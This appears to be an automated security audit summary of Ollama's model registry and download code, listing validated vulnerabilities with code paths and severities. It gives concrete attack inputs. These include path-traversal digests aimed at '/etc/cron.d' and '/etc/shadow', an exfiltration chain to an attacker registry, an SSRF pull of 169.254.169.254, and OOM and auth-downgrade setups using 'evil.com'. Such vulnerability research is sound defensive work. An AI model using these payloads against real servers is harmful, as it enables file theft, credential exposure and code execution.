# Deep Probe Summary: Group A — Registry / Download / Blob Store

Status: complete
Loops: 1
Total hypotheses: 20 (PH-01 through PH-20)
Validated: 14
Needs-Deeper: 2
Fragile (conditionally validated): 3
Stop reason: all entry points covered; remaining NEEDS-DEEPER items have lower risk signal than validated findings

---

## Validated Hypotheses

### PH-01 / PH-15: pullWithTransfer digest path traversal → arbitrary file write
- Reasoning-Model: Pre-Mortem (backward) + Causal (counterfactual)
- Target: `x/imagegen/transfer/transfer.go:165` — `digestToPath`; write sink at `x/imagegen/transfer/download.go:213-266` — `downloader.save`
- Attack input: manifest with `{"mediaType":"application/vnd.ollama.image.tensor","digest":"sha256:aaaa...","size":1}` (tensor layer to flip dispatch) + `{"mediaType":"application/vnd.ollama.image.model","digest":"sha256:../../../etc/cron.d/0pwn","size":100000000}` (traversal + large size)
- Code path: `server/images.go:633` hasTensorLayers → `images.go:721` pullWithTransfer → `images.go:724` blobs[i].Digest = layer.Digest (no BlobsPath) → `transfer/transfer.go:165` digestToPath → `transfer/download.go:213` filepath.Join → `os.MkdirAll` + `os.Create` sink; `os.Rename(tmp, dest)` only runs on hash match, but for `size >= 64MB` the `.tmp` file persists on hash mismatch
- Sanitizers on path: `manifest.BlobsPath` at `manifest/paths.go:40` — bypassable: NOT CALLED in pullWithTransfer path
- Security consequence: Arbitrary file write (partial-content `.tmp`) at any path writable by ollama user; on Linux, `/etc/cron.d/`, `/etc/profile.d/`, `~/.ssh/authorized_keys`, `/var/spool/cron/` = RCE. Also: `os.Rename(tmp, dest)` runs on hash MATCH, so with a size=0 empty-string-digest layer, an empty file is created at the traversal path (PH-10 variant).
- Severity estimate: CRITICAL
- Evidence file: round-1-evidence.md

### PH-02 / PH-20: Size-only cache-hit → model substitution without hash verification
- Reasoning-Model: Pre-Mortem (backward) + Causal (counterfactual)
- Target: `x/imagegen/transfer/download.go:57` — cache-hit check; also `server/download.go:478` — legacy `downloadBlob`
- Attack input: Pre-stage a malicious GGUF file at `$OLLAMA_MODELS/blobs/sha256-<digest>` with the correct file size matching the legitimate model's blob size
- Code path: fast path: `os.Stat → fi.Size() == b.Size → skip download` (no hash); legacy path: `os.Stat → cacheHit=true → skipVerify[digest]=true → verifyBlob skipped`
- Sanitizers on path: `verifyBlob` at `server/images.go:1030` — bypassable: skipped when `cacheHit=true` via `skipVerify` map
- Security consequence: Malicious model weights served to inference engine; crafted GGUF with integer-overflow shape → OOB read in llama.cpp cgo; chain from PH-01 can plant the file of exact correct size before cache-hit
- Severity estimate: HIGH
- Evidence file: round-1-evidence.md

### PH-03 / PH-17: SSRF via /api/pull registry hostname
- Reasoning-Model: Pre-Mortem (backward) + Causal (counterfactual)
- Target: `server/images.go:854` — `pullModelManifest` builds `requestURL` from attacker-controlled `n.BaseURL()`
- Attack input: `POST /api/pull {"name":"169.254.169.254/x:latest","insecure":true}` (or any IP/hostname of internal service)
- Code path: `routes.go:931` parseNormalizePullModelRef → `isValidPart` allows `.` in host → `PullModel` → `images.go:615` insecure check bypassed when `req.Insecure=true` → `pullModelManifest` → HTTP GET to `http://169.254.169.254/v2/x/manifests/latest`
- Sanitizers on path: `parseNormalizePullModelRef` validates syntax only; `isValidPart` for kindHost allows `.` (IP addresses); no host allowlist
- Security consequence: SSRF to any HTTP endpoint; IMDS credentials on cloud, internal service probing; error message at `images.go:622` reflects registry response body
- Severity estimate: HIGH
- Evidence file: round-1-evidence.md

### PH-04 / PH-18: pullModelManifest io.ReadAll — manifest response OOM DoS
- Reasoning-Model: Pre-Mortem (backward) + Causal (combined with PH-14)
- Target: `server/images.go:864` — `io.ReadAll(resp.Body)` in `pullModelManifest`
- Attack input: `POST /api/pull {"name":"attacker.com/evil:latest"}` where `attacker.com` serves `GET /v2/.../manifests/latest` with infinite/multi-GB response body
- Code path: `PullModel` → `pullModelManifest` → `makeRequestWithRetry` → `makeRequest` → `io.ReadAll(resp.Body)` [no LimitReader]
- Sanitizers on path: none — no `io.LimitReader` at this call site
- Security consequence: Process OOM → SIGKILL → all active inference sessions dropped; unauthenticated DoS
- Severity estimate: HIGH
- Evidence file: round-1-evidence.md

### PH-14 / PH-18 (combined): getAuthorizationToken io.ReadAll — auth token response OOM DoS
- Reasoning-Model: Contradiction (assumption: tokens are small) + Causal
- Target: `server/auth.go:81` — `io.ReadAll(response.Body)` in `getAuthorizationToken`
- Attack input: Malicious registry returns 401 on initial manifest fetch → token endpoint controlled by attacker returns multi-GB body
- Code path: `makeRequestWithRetry` → 401 handling → `getAuthorizationToken` → `makeRequest` to realm URL → `io.ReadAll(response.Body)` [no LimitReader]
- Sanitizers on path: realm-host check at `auth.go:60` — does NOT prevent large response body from realm
- Security consequence: OOM DoS; occurs before manifest fetch, so every single `POST /api/pull` pointing at a malicious registry triggers this
- Severity estimate: HIGH
- Evidence file: round-1-evidence.md

### PH-08 / PH-16: pushWithTransfer reads via digestToPath — arbitrary file read + exfiltration
- Reasoning-Model: Contradiction (assumption: BlobsPath covers all paths) + Causal
- Target: `x/imagegen/transfer/upload.go:181` — `os.Open(filepath.Join(u.srcDir, digestToPath(blob.Digest)))` in `uploader.uploadOnce`
- Attack input: (1) Pull from malicious registry writes manifest with traversal digest `"sha256:../../../etc/shadow"` to `$OLLAMA_MODELS/manifests/`. (2) `POST /api/push {"name":"<same model>"}` → pushWithTransfer reads traversal path and uploads to attacker registry.
- Code path: `server/images.go:797` pushWithTransfer copies `layer.Digest` into `blobs[i].Digest` → `transfer.Upload` → `uploader.uploadOnce` → `os.Open(filepath.Join(srcDir, digestToPath("sha256:../../../etc/shadow")))`
- Sanitizers on path: none — `pushWithTransfer` does not call `BlobsPath`; manifest from pull stored verbatim
- Security consequence: Arbitrary file read + exfiltration of any file readable by ollama user (e.g., `/etc/shadow`, `~/.ssh/id_rsa`, application secrets) sent to attacker-controlled registry
- Severity estimate: HIGH
- Evidence file: round-1-evidence.md

### PH-09 / PH-19: Realm HTTP downgrade — ed25519 auth token sent over plaintext
- Reasoning-Model: Contradiction (assumption: realm host check prevents token theft)
- Target: `server/auth.go:53-99` — `getAuthorizationToken` missing scheme check
- Attack input: Attacker controls registry at `evil.com`; returns `WWW-Authenticate: Bearer realm="http://evil.com/token",service="evil.com",scope="..."` on 401
- Code path: `getAuthorizationToken` → `challenge.URL()` → `redirectURL.Host == originalHost` check passes (same host) → `makeRequest` sends to `http://evil.com/token` with ed25519 `Authorization` header
- Sanitizers on path: realm-host check at `auth.go:60` — bypassable: checks HOST not SCHEME; HTTP downgrade passes host check
- Security consequence: Ed25519-signed auth token readable by MITM on plaintext HTTP path; token can be replayed to authenticate as the victim to ollama.com and the registry
- Severity estimate: HIGH
- Evidence file: round-1-evidence.md

### PH-05: HTTP 206 Content-Range not validated — persistent partial-file DoS
- Reasoning-Model: Pre-Mortem (backward)
- Target: `server/download.go:331-389` — `blobDownload.downloadChunk`; no status code or Content-Range validation
- Attack input: MITM on blob CDN path returns HTTP 200 with full blob body to all Range requests
- Code path: `downloadChunk` → `http.DefaultClient.Do(req)` → `io.CopyN(w, resp.Body, part.Size-part.Completed.Load())` — no `resp.StatusCode == 206` check; 200 response writes first `part.Size` bytes into every part slot → global hash mismatch → partial file persists → stuck download loop
- Sanitizers on path: streaming hash detects mismatch; BUT partial file NOT cleaned up on mismatch (Finding 7 in KB)
- Security consequence: Persistent stuck download; user must manually delete `-partial*` files; DoS without silent corruption (hash mismatch detected)
- Severity estimate: MEDIUM
- Evidence file: round-1-evidence.md

### PH-10: Zero-size traversal-digest → empty file creation at any path
- Reasoning-Model: Contradiction (assumption: size field bounds all write operations)
- Target: `x/imagegen/transfer/download.go:212-266` — `downloader.save`
- Attack input: Manifest layer with `size=0` and `digest="sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"` (sha256 of empty string) and a traversal path as the digest
- Code path: `save` → `existingSize=0` → `os.Create(tmp)` → write 0 bytes → `sha256("")` matches digest → `os.Rename(tmp, dest)` — clean rename, no residue
- Sanitizers on path: `digestToPath` — bypassable: no validation; hash check passes for empty content with empty-hash digest
- Security consequence: Clean empty file created at any traversal path; useful for creating `.ssh/authorized_keys` (empty removes auth requirement on some configs), touching `.htaccess`, creating lock files, etc.
- Severity estimate: MEDIUM
- Evidence file: round-1-evidence.md

### PH-11: handlePull no body size limit when dispatched via client2 bypass
- Reasoning-Model: Contradiction (assumption: decodeUserJSON prevents abuse)
- Target: `server/internal/registry/server.go:264` — `decodeUserJSON[*params](r.Body)` with no MaxBytesReader
- Attack input: `POST /api/pull` with multi-GB JSON body when `OLLAMA_EXPERIMENT=client2` is set
- Code path: `registry.Local.serveHTTP` dispatches `/api/pull` before gin chain → `handlePull` → `decodeUserJSON` → `json.NewDecoder(r.Body).Decode` reads unbounded body
- Sanitizers on path: gin middleware body limit — bypassable: `client2` path skips gin entirely
- Security consequence: OOM DoS via unbounded JSON body; requires `OLLAMA_EXPERIMENT=client2` environment variable
- Severity estimate: MEDIUM (gated by experiment flag)
- Evidence file: round-1-evidence.md

### PH-12: HTTPS-to-HTTP CDN redirect — blob downloaded over plaintext (DoS via hash mismatch loop)
- Reasoning-Model: Contradiction (assumption: Insecure flag controls all HTTP access)
- Target: `server/download.go:265-269` — `directURL` from `resp.Location()` without scheme check; used at line 287 in all `downloadChunk` calls
- Attack input: Attacker-controlled or MITM registry returns `302 Location: http://cdn.attacker.com/blob` on initial blob GET
- Code path: `blobDownload.run` → redirect stops at off-host → `resp.Location()` returns HTTP URL → all subsequent part downloads use `directURL` over HTTP
- Sanitizers on path: streaming hash detects mismatch if content is wrong; but scheme is never re-checked
- Security consequence: Blob bytes travel over HTTP (MITM-readable); hash detects wrong content but the `.tmp` partial file persists → stuck download DoS
- Severity estimate: MEDIUM-HIGH (scheme integrity violation; DoS confirmed; silent compromise requires hash collision)
- Evidence file: round-1-evidence.md

### PH-06: Slow-retry goroutine race — stray write may land after hash check
- Reasoning-Model: Pre-Mortem (backward) — Fragile
- Target: `server/download.go:283-327` — `blobDownload.run` errgroup retry loop; `file.Close()` then `os.Rename`
- Attack input: Attacker controls origin + can induce `errPartStalled`; times the stray write to arrive after hash computation but before/after rename
- Code path: goroutine A completes part N (MarkComplete); hasher reads part N; goroutine B (retry of same part after stall) sends late write to part N's offset range; if rename already happened, the final blob file is corrupted
- Sanitizers on path: errgroup context cancellation should cancel the fetcher goroutine; streaming hash detects mismatch if it reads before the stray write
- Security consequence: Silent corruption of on-disk blob with attacker bytes at specific offsets, bypassing hash check; requires MITM + goroutine-race win — probabilistic
- Severity estimate: HIGH (if exploited); Fragile (goroutine race)
- Evidence file: round-1-evidence.md

---

## NEEDS-DEEPER

### PH-07: fixBlobs symlink rename — potential file rename outside blob directory
- Why unresolved: `fixBlobs` uses `filepath.Walk` which follows symlinks to directories. If a symlink to another directory is placed in `$OLLAMA_MODELS/blobs/`, Walk descends into it. Files inside the symlinked directory matching `sha256:XXXX` pattern get renamed. This requires prior write access to the blob directory (e.g., via PH-01). The standalone impact (renaming external files to `sha256-XXXX`) is limited but may interact with other components.
- Suggested follow-up: Phase 8 should trace all callers of `fixBlobs` to determine when it is invoked (startup? migration?); determine if an attacker-planted symlink in the blobs directory can cause rename of files outside that directory; check if the renamed file name collisions could be exploited.

### PH-13: imagegen/manifest BlobPath and x/create/create.go resolveManifestPath traversal propagation
- Why unresolved: `x/imagegen/manifest/manifest.go:BlobPath` uses raw `strings.Replace(digest, ":", "-", 1)` — same unvalidated pattern. Callers include `x/mlxrunner/model/root.go:48` and others. These are read-side callers (os.Open, os.ReadFile) — arbitrary file read when fed a manifest with traversal digest. The question is whether these are reachable from a network-facing API on HEAD `57653b8e` or only from experimental/local paths.
- Suggested follow-up: Phase 8 should enumerate all callers of `x/imagegen/manifest/manifest.go:BlobPath` and `x/imagegen/manifest/manifest.go:resolveManifestPath`; determine whether any caller receives a manifest from a network source (imagegen API endpoint); if so, this is an independent HIGH-severity arbitrary file read.

---

## Coverage Summary

| Entry Point | backward-reasoner | contradiction-reasoner | causal-verifier |
|------------|:-:|:-:|:-:|
| `POST /api/pull` → `PullModel` → manifest fetch (SSRF, OOM) | PH-03, PH-04 | PH-14 | PH-17, PH-18 |
| `pullWithTransfer` → `digestToPath` (path traversal) | PH-01 | PH-08 | PH-15, PH-16 |
| `downloadBlob` cache-hit (size-only, no hash) | PH-02 | PH-13 | PH-20 |
| `blobDownload.downloadChunk` (Range/206 not validated) | PH-05, PH-06 | PH-12 | CROSS-05 |
| `getAuthorizationToken` realm HTTP downgrade | NONE | PH-09 | PH-19 |
| `getAuthorizationToken` io.ReadAll OOM | PH-04 (indirect) | PH-14 | PH-18 |
| `transfer.Download` negative/zero size | NONE | PH-10 | CROSS-02 |
| `registry.Local` client2 bypass + body size | NONE | PH-11 | NONE |
| `pushWithTransfer` → digestToPath (file read) | NONE | PH-08 | PH-16 |
| `server/upload.go` abort path | NONE | NONE | NONE (NEEDS-DEEPER) |
| `registry.go chunksums` URL injection | NONE | NONE | NONE (NEEDS-DEEPER) |
